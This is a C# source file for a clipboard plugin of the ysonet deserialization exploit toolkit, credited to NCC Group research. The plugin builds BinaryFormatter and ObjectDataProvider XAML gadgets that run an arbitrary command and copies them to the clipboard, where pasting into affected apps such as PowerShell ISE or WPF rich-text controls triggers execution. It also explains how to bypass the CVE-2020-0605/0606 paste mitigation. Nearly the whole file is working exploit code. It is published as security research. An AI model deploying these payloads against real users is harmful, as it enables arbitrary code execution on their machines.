using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `DataObject.SetData Method`: https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.dataobject.setdata
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  It was possible to copy other objects into the clipboard but this plugin only utilises one method that is used in the DataSetBinaryMarshal class
 *  The object will be copied to the clipboard and can be pasted into other affected applications such as Windows PowerShell ISE
 *  This PoC produces an error and may crash the application
 *
 *  Delivery modes (see --mode):
 *   - winforms (default): the original behavior. A DataObject holds a BinaryFormatter
 *     TextFormattingRunProperties gadget under a WinForms format.
 *   - wpfxaml: an ObjectDataProvider XAML string placed under the WPF 'Xaml'
 *     (DataFormats.Xaml) format, targeting WPF InkCanvas/RichTextBox paste. This is
 *     restrictive by default since the CVE-2020-0605/0606 clipboard mitigation: it
 *     only fires when the target enables the legacy clipboard switch or predates the
 *     mitigation. It is a delivery vector for the ObjectDataProvider gadget, not a
 *     default-config issue.
 *
 *  How the wpfxaml paste gate works:
 *   The WPF paste sinks (MS.Internal.Ink.XamlClipboardData.DoPaste and
 *   System.Windows.Documents.TextEditorCopyPaste.PasteXaml) run the clipboard XAML
 *   through RestrictiveXamlXmlReader unless the app opts out with the AppContext switch
 *   'Switch.System.Windows.EnableLegacyDangerousClipboardDeserializationMode' (default
 *   false). With the switch off the ObjectDataProvider gadget is dropped; set it true
 *   (or run a framework predating the mitigation, and with Device Guard / WDAC off) and
 *   the gadget runs on paste. The --test option below simulates both paths locally.
 *
 *  References and credit:
 *   - ObjectDataProvider XAML gadget: Oleksandr Mirosh and Alvaro Munoz
 *     ("Friday the 13th JSON attacks", Black Hat USA 2017). ysonet builds it with
 *     ObjectDataProviderGenerator.
 *   - Clipboard DataObject.SetData deserialization vector: NCC Group research
 *     "Use of Deserialisation in .NET Framework Methods and Classes" (Soroush Dalili,
 *     Dec 2018), the origin of this plugin.
 *   - The RestrictiveXamlXmlReader clipboard-paste mitigation this mode works around
 *     is CVE-2020-0605 / CVE-2020-0606 (the latter, "code execution via malicious WPF
 *     annotation/Sticky Notes files", was credited to Soroush Dalili).
 *   - Not to be confused with CVE-2026-50646 (July 2026): that fix hardens the WPF
 *     copy/undo XAML sinks, which fire when a victim copies or undoes attacker-loaded
 *     document content, not when pasting an attacker clipboard. This paste-delivery
 *     mode does not reach or exploit it.
 **/

namespace ysonet.Plugins
{
    public class ClipboardPlugin : IPlugin, IPluginModes
    {
        static string format = System.Windows.Forms.DataFormats.Serializable;
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;
        static string mode = "winforms";
        static int xamlVariant = 2;

        static OptionSet options = new OptionSet()
            {
                {"m|mode=", "delivery mode (default: winforms). 'winforms': a BinaryFormatter gadget under a WinForms format (see --format). 'wpfxaml': an ObjectDataProvider XAML string under the WPF 'Xaml' format, for InkCanvas/RichTextBox paste; fires only if the target enabled the legacy clipboard switch or predates the CVE-2020-0605/0606 mitigation (see the header comment for details).", v => { if (v != null) mode = v.Trim().ToLowerInvariant(); } },
                {"F|format=", "winforms mode only. The object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: WindowsForms10PersistentObject (the only one that works in Feb 2020 as a result of an incomplete silent patch - will not be useful to target text-based fields anymore)", v => format = v },
                {"xamlvariant=", "wpfxaml mode only. ObjectDataProvider XAML variant: 1 = bare ObjectDataProvider, 2 = ResourceDictionary wrapper (looks like real clipboard XAML). Default: 2", v => int.TryParse(v, out xamlVariant) },
                {"c|command=", "the command to be executed", v => command = v },
                {"t|test", "whether to run payload locally. In wpfxaml mode this simulates the WPF paste path (restrictive vs legacy) and runs the command if it fires. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
            };

        public string Name()
        {
            return "Clipboard";
        }

        public string Description()
        {
            return "Generates payload for DataObject and copies it into the clipboard - ready to be pasted in affected apps";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }


        public OptionSet Options()
        {
            return options;
        }

        // Interactive-only mode descriptions (see IPluginModes). Each maps to a value
        // of the plugin's own --mode option; --format applies only to winforms and
        // --xamlvariant only to wpfxaml, which the modes encode. The CLI is unchanged.
        public List<PluginMode> InteractiveModes()
        {
            return new List<PluginMode>
            {
                new PluginMode {
                    Name = "WinForms (BinaryFormatter under a WinForms format)",
                    Description = "TextFormattingRunProperties under a WinForms clipboard format.",
                    Options = new string[] { "command", "format", "test", "minify", "usesimpletype" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "mode", "winforms" } },
                },
                new PluginMode {
                    Name = "WPF XAML (ObjectDataProvider under the Xaml format)",
                    Description = "ObjectDataProvider XAML under the WPF 'Xaml' clipboard format.",
                    Options = new string[] { "command", "xamlvariant", "test", "minify", "usesimpletype" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "mode", "wpfxaml" } },
                },
            };
        }

        public object Run(string[] args)
        {
            // to solve this error: Current thread must be set to single thread apartment (STA) mode before OLE calls can be made
            // we cannot use the [STAThread] outside of this plugin
            // here is a solution
            Exception threadError = null;
            var staThread = new Thread(delegate ()
            {
                try
                {
                    InputArgs inputArgs = new InputArgs();
                    List<string> extra;
                    try
                    {
                        extra = options.Parse(args);
                        inputArgs.Cmd = command;
                        inputArgs.Minify = minify;
                        inputArgs.UseSimpleType = useSimpleType;
                        inputArgs.IsRawCmd = rawcmd;
                        inputArgs.Test = test;
                    }
                    catch (OptionException e)
                    {
                        Console.Write("ysonet: ");
                        Console.WriteLine(e.Message);
                        Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                        throw new Exception(e.Message);
                    }

                    if (mode != "winforms" && mode != "wpfxaml")
                    {
                        Console.Write("ysonet: ");
                        Console.WriteLine("Unknown mode '" + mode + "'. Use 'winforms' or 'wpfxaml'.");
                        Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                        throw new Exception("Unknown mode '" + mode + "'. Use 'winforms' or 'wpfxaml'.");
                    }

                    if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
                    {
                        Console.Write("ysonet: ");
                        Console.WriteLine("Incorrect plugin mode/arguments combination");
                        Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                        throw new Exception("Incorrect plugin mode/arguments combination");
                    }

                    if (mode == "wpfxaml")
                    {
                        if (xamlVariant != 1 && xamlVariant != 2)
                        {
                            Console.Write("ysonet: ");
                            Console.WriteLine("Invalid xamlvariant '" + xamlVariant + "'. Use 1 or 2.");
                            Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                            throw new Exception("Invalid xamlvariant '" + xamlVariant + "'. Use 1 or 2.");
                        }

                        // Build the ObjectDataProvider XAML with ysonet's existing generator,
                        // then place it as a plain string under the WPF 'Xaml'
                        // (DataFormats.Xaml == "Xaml") format. The WPF paste path reads it via
                        // GetData(DataFormats.Xaml) as a string and hands it to XamlReader.Load,
                        // which runs the gadget when the paste path is non-restrictive.
                        ObjectDataProviderGenerator odpGen = new ObjectDataProviderGenerator();
                        odpGen.Options().Parse(new string[] { "--variant", xamlVariant.ToString() });

                        // Generate without the generator's own local test; when --test is set we
                        // run our own faithful paste-path simulation below instead.
                        bool runTest = inputArgs.Test;
                        inputArgs.Test = false;
                        string xamlPayload = (string)odpGen.Generate("xaml", inputArgs);
                        inputArgs.Test = runTest;

                        // Use the WPF clipboard (System.Windows), not the WinForms one. A
                        // WinForms DataObject.SetData("Xaml", string) serializes the string with
                        // BinaryFormatter into the clipboard, but WPF paste reads the 'Xaml'
                        // format as raw UTF-16 text, so it would get garbage. WPF's own
                        // DataObject stores the string the way WPF paste reads it back.
                        System.Windows.DataObject wpfDataObject = new System.Windows.DataObject();
                        wpfDataObject.SetData(System.Windows.DataFormats.Xaml, xamlPayload);

                        System.Windows.Clipboard.Clear();
                        System.Windows.Clipboard.SetDataObject(wpfDataObject, true);

                        if (runTest)
                        {
                            RunWpfXamlPasteTest(xamlPayload, inputArgs);
                        }
                    }
                    else
                    {
                        // Creates a new data object.
                        System.Windows.Forms.DataObject myDataObject = new System.Windows.Forms.DataObject();

                        myDataObject.SetData(format, false, new AxHostStateMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs))); // for System.Windows.Forms

                        /*
                        myDataObject.SetData(format, new DataSetBinaryMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), false); // for System.Windows
                        */

                        Clipboard.Clear();
                        Clipboard.SetDataObject(myDataObject, true);

                        if (test)
                        {
                            // PoC on how it works in practice
                            try
                            {
                                IDataObject dataObj = Clipboard.GetDataObject();
                                Object testObj = dataObj.GetData(format);
                            }
                            catch (Exception err)
                            {
                                Debugging.ShowErrors(inputArgs, err);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    threadError = ex;
                }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();

            if (threadError != null) throw threadError;

            return "Object copied to the clipboard";
        }

        // Faithful local simulation of the WPF paste path for the wpfxaml mode.
        // WARNING: this runs the command locally if the gadget fires. It loads the
        // same XAML two ways to mirror the paste gate:
        //  1) restrictive (RestrictiveXamlXmlReader) - the default paste behavior
        //     since the CVE-2020-0605/0606 mitigation -> the gadget is blocked.
        //  2) non-restrictive - what the paste path uses when the target enables the
        //     legacy clipboard switch or predates the mitigation -> the gadget runs.
        // All diagnostic output goes to stderr so stdout/piping stays clean.
        private static void RunWpfXamlPasteTest(string xamlPayload, InputArgs inputArgs)
        {
            Console.Error.WriteLine("[wpfxaml test] Simulating the WPF paste path locally. This runs your command if it fires.");

            Console.Error.WriteLine("[wpfxaml test] 1) restrictive load (default paste since the CVE-2020-0605/0606 mitigation):");
            try
            {
                SerializersHelper.Xaml_deserialize_restrictive(xamlPayload);
                Console.Error.WriteLine("[wpfxaml test]    blocked: RestrictiveXamlXmlReader dropped ObjectDataProvider, so the gadget did not run. This is the safe default paste.");
            }
            catch (NotSupportedException nse)
            {
                Console.Error.WriteLine("[wpfxaml test]    " + nse.Message);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[wpfxaml test]    blocked with an exception (gadget did not run): " + ex.GetType().Name + ": " + ex.Message);
            }

            Console.Error.WriteLine("[wpfxaml test] 2) non-restrictive load (legacy switch on, or pre-mitigation framework):");
            try
            {
                SerializersHelper.Xaml_deserialize(xamlPayload);
                Console.Error.WriteLine("[wpfxaml test]    gadget executed (command ran locally).");
            }
            catch (Exception err)
            {
                Debugging.ShowErrors(inputArgs, err);
            }
        }
    }
}
